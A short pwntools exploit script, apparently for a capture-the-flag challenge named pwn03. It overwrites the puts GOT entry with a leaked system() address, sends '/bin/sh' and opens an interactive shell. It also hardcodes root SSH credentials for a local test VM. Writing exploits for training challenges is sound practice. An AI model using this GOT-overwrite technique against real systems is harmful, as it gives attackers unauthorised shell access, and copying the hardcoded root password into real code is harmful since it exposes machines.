from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn03"

exe = ELF("./chall_patched",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall_patched"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    log.info("happy pwn!")
    ru(b"address: ")
    system_addr = int(rn(14), 16)
    log.success(f"system: {hex(system_addr)}")
    puts_got = exe.got.puts
    log.success(f"puts@got: {hex(puts_got)}")
    sla(b"address> ", hex(puts_got))
    sla(b"value> ", hex(system_addr))
    sla(b"command> ", b"/bin/sh")
    pause()
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()
